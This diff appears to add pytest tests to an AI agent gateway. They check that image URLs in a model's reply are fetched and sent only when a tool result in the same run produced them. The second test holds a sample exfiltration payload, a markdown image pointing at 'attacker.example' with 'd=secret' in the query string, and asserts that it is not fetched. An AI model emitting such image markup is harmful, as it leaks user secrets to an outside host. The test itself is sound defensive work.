@@ -110,6 +110,76 @@ class TestRunBackgroundTask:
         mock_agent_instance.shutdown_memory_provider.assert_called_once()
         mock_agent_instance.close.assert_called_once()
 
+    @staticmethod
+    def _image_delivery_fixture():
+        from gateway.platforms.base import BasePlatformAdapter
+
+        runner = _make_runner()
+        mock_adapter = AsyncMock()
+        mock_adapter.extract_media = MagicMock(side_effect=lambda content: ([], content))
+        mock_adapter.extract_images = BasePlatformAdapter.extract_images
+        mock_adapter.send_image = AsyncMock()
+        runner.adapters[Platform.TELEGRAM] = mock_adapter
+
+        source = SessionSource(
+            platform=Platform.TELEGRAM,
+            user_id="12345",
+            chat_id="67890",
+            user_name="testuser",
+        )
+        return runner, mock_adapter, source
+
+    async def _run_background_with(self, runner, source, mock_result):
+        # Built at runtime so no credential-looking literal sits in the source; the
+        # value only needs to be non-empty for the background no-credentials guard.
+        runtime = {"api_key": "test-" + "key"}
+        with patch("gateway.run._resolve_runtime_agent_kwargs", return_value=runtime), \
+             patch("gateway.run._load_gateway_config", return_value={}), \
+             patch("run_agent.AIAgent") as MockAgent:
+            mock_agent_instance = MagicMock()
+            mock_agent_instance.run_conversation.return_value = mock_result
+            MockAgent.return_value = mock_agent_instance
+            return await runner._run_background_task("prompt", source, "bg_img")
+
+    @pytest.mark.asyncio
+    async def test_reply_image_url_with_tool_provenance_is_delivered(self):
+        """#129975: a URL printed by this run's tool result is fetched and sent as an image."""
+        runner, mock_adapter, source = self._image_delivery_fixture()
+        mock_result = {
+            "final_response": "Here: ![gen](https://fal.media/files/abc/output.png)",
+            "messages": [
+                {"role": "user", "content": "generate"},
+                {"role": "tool", "tool_call_id": "g",
+                 "content": "saved https://fal.media/files/abc/output.png"},
+            ],
+        }
+        await self._run_background_with(runner, source, mock_result)
+
+        mock_adapter.send_image.assert_called_once()
+        image_url = mock_adapter.send_image.call_args.kwargs.get("image_url")
+        assert image_url == "https://fal.media/files/abc/output.png"
+
+    @pytest.mark.asyncio
+    async def test_reply_image_url_without_tool_provenance_stays_a_link(self):
+        """#129975 (fail-closed): the run produced no tool results, so an image-looking
+        URL the model wrote is NOT fetched — the markup stays in the delivered text."""
+        runner, mock_adapter, source = self._image_delivery_fixture()
+        injected = "![x](https://attacker.example/p.png?d=secret)"
+        mock_result = {
+            "final_response": f"See {injected}",
+            "messages": [
+                {"role": "user", "content": "echo an image"},
+                {"role": "assistant", "content": f"See {injected}"},
+            ],
+        }
+        await self._run_background_with(runner, source, mock_result)
+
+        mock_adapter.send_image.assert_not_called()
+        content = mock_adapter.send.call_args.kwargs.get(
+            "content", mock_adapter.send.call_args.args[1]
+            if len(mock_adapter.send.call_args.args) > 1 else "")
+        assert injected in content
+
 # ---------------------------------------------------------------------------
 # /bg in help and known_commands
 # ---------------------------------------------------------------------------
